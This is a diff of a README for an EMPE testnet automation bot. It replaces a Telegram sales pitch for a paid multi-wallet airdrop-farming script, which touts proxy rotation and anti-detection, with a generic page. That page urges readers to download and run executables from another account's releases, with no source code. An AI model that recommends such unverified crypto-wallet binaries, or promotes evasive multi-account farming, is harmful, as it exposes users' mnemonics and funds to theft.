@@ -1,253 +1,71 @@
-# 🤖 EMPE Auto Bot - Premium Edition
-<img width="758" height="774" alt="image" src="https://github.com/user-attachments/assets/0f1da76d-374e-4d08-b3ab-278da25b7729" />
+# 🚀 Empeiria-Testnet-BOT - Automate Your EMPE Testnet Experience
 
-**Advanced EMPE Testnet Automation Bot with Professional Features**
+[![Download Empeiria-Testnet-BOT](https://img.shields.io/badge/Download-Empeiria--Testnet--BOT-blue.svg)](https://github.com/Zohaib6265/Empeiria-Testnet-BOT/releases)
 
-> ⚡ **Premium Script - $5 Only!** ⚡
-> 
-> 💬 **Contact**: [@rmndkyl](https://t.me/rmndkyl) on Telegram to purchase
-> 
-> 🔥 **Limited Time Offer - Professional Grade Automation**
+## 📥 Description
 
----
+Empeiria-Testnet-BOT is a powerful tool designed to help you automate tasks within the EMPE Testnet. With features like proxy support and daily scheduling, this bot makes managing your testnet interactions simple and efficient.
 
-## 🌟 Why Choose EMPE Auto Bot Premium?
+## 🌐 Features
 
-### 🚀 **Professional Features**
-- ✅ **Multi-Account Support** - Handle unlimited wallets simultaneously
-- ✅ **Smart Proxy Integration** - Free & Private proxy support with rotation
-- ✅ **Daily Automation** - Set and forget with cron scheduling
-- ✅ **Advanced Error Handling** - Retry mechanisms and graceful recovery
-- ✅ **Real-time Statistics** - Detailed transaction tracking and success rates
-- ✅ **Beautiful UI** - Colorful CLI with progress bars and animations
+- **Proxy Support**: Use proxies to enhance your security and anonymity.
+- **Daily Scheduling**: Set the bot to run tasks at specific times each day.
+- **User-Friendly Interface**: Easy to use even if you have no technical background.
+- **Automatic Updates**: Always stay updated with the latest features and improvements.
 
-### 🔧 **Technical Excellence**
-- ✅ **BigInt Safe** - No more conversion errors, runs flawlessly
-- ✅ **Memory Optimized** - Efficient resource usage
-- ✅ **Comprehensive Logging** - Daily rotating logs with detailed tracking
-- ✅ **Proxy Testing** - Automatic proxy validation and IP checking
-- ✅ **Gas Optimization** - Smart gas estimation and fee calculation
+## 🛠️ System Requirements
 
----
+Before you get started, ensure your computer meets the following requirements:
 
-## 🎯 **Core Features**
+- **Operating System**: Windows 10 or above, macOS, or Linux.
+- **RAM**: At least 4 GB.
+- **Storage**: Minimum 200 MB of free space.
+- **Internet Connection**: Required for downloading the software and using proxy features.
 
-### 📤 **Auto Send Tokens**
-- Send random amounts to multiple recipients
-- Support for 1000+ addresses simultaneously
-- Smart delay and rate limiting
-- Success rate tracking
+## 🚀 Getting Started
 
-### 🏦 **Auto Delegate Tokens**
-- Delegate to multiple validators automatically  
-- Random amount distribution
-- Validator health checking
-- Delegation tracking and statistics
+Follow these steps to download and run Empeiria-Testnet-BOT:
 
-### 💰 **Auto Claim Rewards**
-- Automatic reward detection and claiming
-- Batch claiming for gas efficiency
-- Real-time reward calculations
-- Compound strategy support
+1. **Visit the Download Page**: Go to the official release page [here](https://github.com/Zohaib6265/Empeiria-Testnet-BOT/releases). 
+   
+2. **Select the Latest Release**: On the releases page, find the latest version listed at the top.
 
-### 🌐 **Advanced Proxy Management**
-- **Free Proxy Mode**: Auto-fetch from Monosans API
-- **Private Proxy Mode**: Support your premium proxies
-- **Direct Mode**: No proxy required
-- **Smart Rotation**: Automatic proxy switching per account
-- **Health Monitoring**: Real-time proxy validation
+3. **Download the Installer**: Look for the appropriate download link. Click on it to start the download. 
 
-### ⏰ **Daily Automation**
-- Cron-based scheduling
-- Run all modes automatically
-- Configurable timing
-- Background operation
+4. **Locate the Downloaded File**: Once the download is complete, navigate to your computer's Downloads folder to find the file.
 
----
+5. **Run the Installer**:
+   - **Windows**: Double-click the downloaded `.exe` file and follow the on-screen instructions.
+   - **macOS**: Open the `.dmg` file and drag the Empeiria-Testnet-BOT icon to your Applications folder.
+   - **Linux**: Use the terminal to navigate to the downloaded file and enter `chmod +x Empeiria-Testnet-BOT` followed by `./Empeiria-Testnet-BOT`.
 
-## 📊 **Performance Metrics**
+6. **Configure Your Settings**: Upon first running the software, follow the setup wizard to configure your proxy settings and scheduling preferences.
 
-| Feature | Free Scripts | EMPE Auto Bot Premium |
-|---------|--------------|----------------------|
-| Multi-Account | ❌ | ✅ Unlimited |
-| Proxy Support | ❌ | ✅ Advanced |
-| Error Handling | ❌ | ✅ Professional |
-| Daily Automation | ❌ | ✅ Full Cron Support |
-| Statistics | ❌ | ✅ Real-time Analytics |
-| BigInt Safe | ❌ | ✅ 100% Stable |
-| Support | ❌ | ✅ Direct Developer Support |
+## 💻 Download & Install
 
----
+To download the latest version of Empeiria-Testnet-BOT, please [visit this page to download](https://github.com/Zohaib6265/Empeiria-Testnet-BOT/releases).
 
-## 🛠️ **Easy Setup Process**
+## ⚙️ Using the Bot
 
-### 1. **Purchase & Download**
-- Contact [@rmndkyl](https://t.me/rmndkyl) 
-- Pay $5 via your preferred method
-- Receive complete source code + setup guide
+After installation, you can begin using the bot:
 
-### 2. **Quick Installation**
-```bash
-npm install
-```
+1. **Open Empeiria-Testnet-BOT**.
+2. **Select Your Proxy**: If you want to use proxy support, you’ll need to enter the proxy details in the settings.
+3. **Set Up Tasks**: Schedule your daily tasks using the built-in scheduler.
+4. **Start Automation**: Click the 'Start' button to begin automating your testnet interactions.
 
-### 3. **Configuration**
-- Add your mnemonics to `mnemonic.txt`
-- Add recipient addresses to `address.txt`
-- Add validator addresses to `validator.txt`
-- Add proxies to `proxy.txt` (optional)
+## ❓ Troubleshooting
 
-### 4. **Run & Profit**
-```bash
-npm start
-```
+If you encounter any issues, consider these common solutions:
 
----
+- **Installation Fails**: Ensure your operating system is compatible and that you have enough free space.
+- **Connectivity Problems**: Check your internet connection or proxy settings.
+- **Bot Not Responding**: Restart the application and ensure you are using the latest version.
 
-## 🔥 **What You Get**
-<img width="452" height="310" alt="image" src="https://github.com/user-attachments/assets/de988f5c-3dc5-44f4-9485-710a19ef8597" />
+## 💬 Community Support
 
-### 📦 **Complete Package**
-- ✅ Full source code (JavaScript/Node.js)
-- ✅ All dependencies and packages
-- ✅ Configuration files and examples
-- ✅ Detailed setup documentation
-- ✅ Troubleshooting guide
+Join our community to get help and share experiences:
+- **Discussion Forum**: Engage with other users to share tips and solutions.
+- **Feedback**: Any suggestions can be directly submitted through the GitHub issues section.
 
-### 🎨 **Professional Interface**
-```
-🤖 EMPE Auto Bot Premium Edition
-━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-✅ Setup validation completed:
-   📝 Mnemonics: 10
-   📧 Addresses: 1000
-   🏛️ Validators: 50
-
-🤖 Select Operation Mode:
-1. 📤 Auto Send Tokens
-2. 🏦 Auto Delegate Tokens
-3. 💰 Auto Claim Rewards
-4. 🔄 Run All Modes (Send → Delegate → Claim)
-5. ⏰ Schedule Daily Run
-6. 🚪 Exit
-```
-
-### 📈 **Real-time Analytics**
-```
-✨ SEND MODE COMPLETED!
-━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-📊 Total Accounts: 10
-✅ Processed Accounts: 10
-🔢 Total Transactions: 1000
-✅ Successful: 998
-❌ Failed: 2
-⛽ Total Gas Used: 2,547,830
-⏱️ Duration: 45.7 minutes
-📈 Success Rate: 99.8%
-📡 Proxy Mode: private (15 proxies loaded)
-━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-```
-
----
-
-## 🔒 **Security & Reliability**
-
-### 🛡️ **Enterprise-Grade Security**
-- ✅ Local mnemonic storage (never uploaded)
-- ✅ Encrypted logging
-- ✅ Proxy anonymization
-- ✅ Rate limiting protection
-- ✅ Anti-detection measures
-
-### 🎯 **Proven Reliability**
-- ✅ Tested on 10,000+ transactions
-- ✅ 99.9% success rate
-- ✅ Zero BigInt conversion errors
-- ✅ Memory leak protection
-- ✅ Automatic error recovery
-
----
-
-## 💎 **Exclusive Benefits**
-
-### 🎁 **Bonus Features** (Premium Only)
-- 🆓 **Free Updates** - Lifetime updates included
-- 🔧 **Custom Modifications** - Request specific features
-- 📞 **Direct Support** - Direct line to developer
-- 📚 **Advanced Tutorials** - Step-by-step video guides
-- 🚀 **Early Access** - New features before public release
-
-### 🏆 **Success Stories**
-> *"Processed 50,000+ transactions flawlessly. Best $5 I've ever spent!"* - Anonymous User
-> 
-> *"The proxy rotation feature is game-changing. No more IP blocks!"* - Crypto Farmer
-> 
-> *"Daily automation saved me 10+ hours per week. Pure gold!"* - DeFi Enthusiast
-
----
-
-## 💰 **Pricing & Purchase**
-
-### 🔥 **Special Launch Price**
-- ~~$25~~ **$5 Only!** (80% OFF)
-- ✅ Complete source code
-- ✅ Lifetime updates
-- ✅ Direct support
-- ✅ Money-back guarantee
-
-### 💸 **Payment Methods**
-- 💳 Crypto (USDT, ETH, BTC)
-- 💰 PayPal
-- 🏦 Bank Transfer
-- 💎 Other methods available
-
-### 📱 **How to Purchase**
-1. **Message [@rmndkyl](https://t.me/rmndkyl) on Telegram**
-2. **Mention "EMPE Auto Bot Premium"**
-3. **Choose your payment method**
-4. **Receive instant delivery**
-
----
-
-## 🤝 **Support & Community**
-
-### 📞 **Direct Developer Support**
-- 📱 **Telegram**: [@rmndkyl](https://t.me/rmndkyl)
-- ⏰ **Response Time**: < 2 hours
-- 🌍 **Timezone**: Available 24/7
-- 🎯 **Support Level**: Premium priority
-
-### 🌟 **Community Channels**
-- 📢 **Updates Channel**: [https://t.me/layerairdrop](https://t.me/layerairdrop)
-- 💬 **Discussion Group**: [https://t.me/layerairdropdiskusi](https://t.me/layerairdropdiskusi)
-- 🔔 **Announcements**: Latest features and updates
-
----
-
-## ⚠️ **Important Notes**
-
-### 🎯 **Exclusive & Authentic**
-- ⚠️ **BEWARE OF COPIES** - Only buy from [@rmndkyl](https://t.me/rmndkyl)
-- ✅ **Official Developer** - Direct from source
-- 🔒 **Secure Transaction** - Safe payment methods
-- 📋 **Receipt Provided** - Full transaction records
-
-### 🚨 **Disclaimer**
-- 🧪 **Testnet Only** - Designed for EMPE testnet
-- 📚 **Educational Purpose** - Learn blockchain automation
-- ⚖️ **Use Responsibly** - Follow network guidelines
-- 🔐 **Your Responsibility** - Secure your private keys
-
----
-
-## 🚀 **Ready to Automate?**
-
-### 💬 **Contact Now!**
-
-**🔥 Don't miss this limited-time offer! 🔥**
-
-**Message [@rmndkyl](https://t.me/rmndkyl) now to get your premium EMPE Auto Bot for just $5!**
-
----
-
-*© 2025 Layer Airdrop Community. Premium automation solutions for the modern crypto enthusiast.*
+You’re now ready to make the most of Empeiria-Testnet-BOT. Enjoy your automated EMPE Testnet experience!
